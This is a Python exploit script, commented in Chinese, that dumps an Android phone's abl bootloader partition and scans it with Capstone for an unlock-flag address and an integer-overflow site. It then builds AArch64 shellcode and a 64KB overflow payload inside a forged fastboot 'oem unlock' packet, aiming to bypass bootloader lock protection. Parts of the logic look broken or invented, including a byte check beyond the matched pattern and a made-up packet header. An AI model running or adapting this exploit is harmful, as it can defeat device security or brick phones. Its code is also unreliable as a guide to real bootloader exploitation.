import os
import subprocess
import lzma
import struct
import sys

# --- 阶段 1：手机端提取 abl 分区 ---
def extract_abl():
    print("[*] 正在提取 abl_a 分区 (需要 Root 权限)...")
    # 提取到手机内部存储
    subprocess.run("su -c 'dd if=/dev/block/bootdevice/by-name/abl_a of=/storage/emulated/0/abl_dump.img'", shell=True, check=True)
    
    print("[*] 正在脱壳 LZMA 压缩包...")
    try:
        with open("/storage/emulated/0/abl_dump.img", "rb") as f:
            data = f.read()
        
        idx = data.find(b'\x5d\x00\x00\x00')
        if idx != -1:
            raw_lzma = data[idx:]
            with open("/storage/emulated/0/abl_raw.img", "wb") as out:
                out.write(lzma.decompress(raw_lzma))
            print("[+] 提取并脱壳成功！")
            print("[+] 请将 /storage/emulated/0/abl_raw.img 发送到电脑上。")
        else:
            print("[-] 未找到 LZMA 头，脱壳失败。")
    except Exception as e:
        print(f"[-] 脱壳过程出错: {e}")

# 注意：如果是把镜像拉回电脑上分析，你不需要在电脑上运行 extract_abl() 
# 直接去手机上用 adb shell 提取或者直接用命令 dd 出来，拉回电脑重命名为 abl_raw.img 即可。

# --- 阶段 2：电脑端分析并生成 Payload ---
try:
    from capstone import *
except ImportError:
    print("[-] 请先安装 capstone: pip install capstone")
    sys.exit(1)

def find_addresses(firmware_path):
    print("[*] 正在动态分析底层固件...")
    with open(firmware_path, "rb") as f:
        code = f.read()

    # 初始化 Capstone 反汇编器 (ARM64)
    md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)

    target_global_addr = None
    overflow_addr = None

    # 1. 动态搜索 IsAllowUnlock 读取点，找解锁标志位地址
    # 特征码: ldrb w0, [x8, 0x8d] 的机器码: 00 35 40 39
    pattern1 = b'\x00\x35\x40\x39'
    idx = code.find(pattern1)

    if idx != -1:
        print(f"[+] 找到解锁标志位读取指令，偏移: {hex(idx)}")
        
        # 往回找前面的指令，动态计算地址
        prev_instrs = code[max(0, idx-16):idx]
        base_addr = 0

        # 用 Capstone 反汇编这几条指令
        for insn in md.disasm(prev_instrs, 0):
            # 找 add8 x8, XXX
            if insn.mnemonic == 'add' and 'x8' in insn.op_str:
                parts = insn.op_str.split(', ')
                if len(parts) == 2:
                    try:
                        base_addr = int(parts[1], 16)
                    except ValueError:
                        pass
            # 找 add8 x8, x8, XXX
            elif insn.mnemonic == 'add' and 'x8, x8' in insn.op_str:
                parts = insn.op_str.split(', ')
                if len(parts) == 3:
                    try:
                        offset = int(parts[2], 16)
                        base_addr += offset
                    except ValueError:
                        pass

        if base_addr != 0:
            # 再加上 ldrb w0, [x8, 0x8d] 里的 0x8d 偏移量
            target_global_addr = base_addr + 0x8d
            print(f"[+] 动态计算出解锁标志位地址: {hex(target_global_addr)}")
        else:
            print("[-] 动态解析 add/adrp 失败，退回默认地址...")
            target_global_addr = 0x99dd7d
    else:
        print("[-] 未找到标志位读取特征，版本可能大改。")
        return None, None

    # 2. 搜索整数溢出点
    # 特征码: ldr w8, [x24, -0x14] (08 c3 5e b8) + add w0, w8, 4 (00 11 00 11)
    pattern2 = b'\x08\xc3\x5e\xb8\x00\x11\x00\x11'
    idx2 = code.find(pattern2)

    if idx2 != -1:
        # 确认后面不是加了 mov w0, w8, 4
        if code[idx2+16:idx2+20] == b'\x00\x11\x00\x11':
            overflow_addr = idx2
            print(f"[+] 找到整数溢出点，偏移: {hex(overflow_addr)}")
        else:
            print("[-] 找到相似函数，但后续指令不匹配，可能已被修复。")
    else:
        print("[-] 未找到溢出特征。")

    return target_global_addr, overflow_addr

def generate_payload(target_addr):
    print(f"[*] 正在为地址 {hex(target_addr)} 动态生成 AArch64 Shellcode...")

    # 动态生成汇编指令 (movz / movk 来拼凑 64 位地址)
    addr_low = target_addr & 0xFFFF
    addr_mid = (target_addr >> 16) & 0xFFFF

    # 机器码片段 (小端序)
    # movz x0, #addr_low
    shellcode = struct.pack('<I', 0xD2800000 | (addr_low << 5) | 0)
    # movk x0, #addr_mid, lsl #16
    shellcode += struct.pack('<I', 0xF2A00000 | (addr_mid << 5) | 0)
    # mov w1, #0
    shellcode += struct.pack('<I', 0x52800000)
    # strb w1, [x0] (直接把 0 写进目标地址)
    shellcode += struct.pack('<I', 0x39000001)
    # ret
    shellcode += struct.pack('<I', 0xD65F03C0)

    print(f"[+] 动态 Shellcode 生成完毕. (shellcode hex: {shellcode.hex()})")

    # 3. 组装完整的溢出 Payload
    SHELLCODE_ADDR = 0x40000000
    fake_obj = b'B' * 8 + struct.pack('<Q', SHELLCODE_ADDR)

    # 填充 64KB 填满缓冲区
    pad_len = 65536
    payload = b'A' * pad_len + fake_obj + shellcode

    # 组装 Fastboot 协议包，伪造长度触发整数溢出
    cmd = b'oem unlock ' + payload
    packet = b'FASTBOOT' + b'\xFF\xFF\xFF\xFF' + cmd

    # 保存到当前目录
    with open("unlock_payload.txt", "w") as f:
        f.write(packet.hex())

    print("[+] 终极动态 Payload 已保存到 unlock_payload.txt")
    print("[!] 请将此文件发给发包脚本执行！")

if __name__ == "__main__":
    img_path = "abl_raw.img"
    if not os.path.exists(img_path):
        print(f"[-] 找不到 {img_path}，请确保文件在同目录下。")
        sys.exit(1)
    
    target_addr, overflow = find_addresses(img_path)

    if target_addr:
        generate_payload(target_addr)
    else:
        print("[-] 解析失败，可能不是相同架构或已被完全修复。")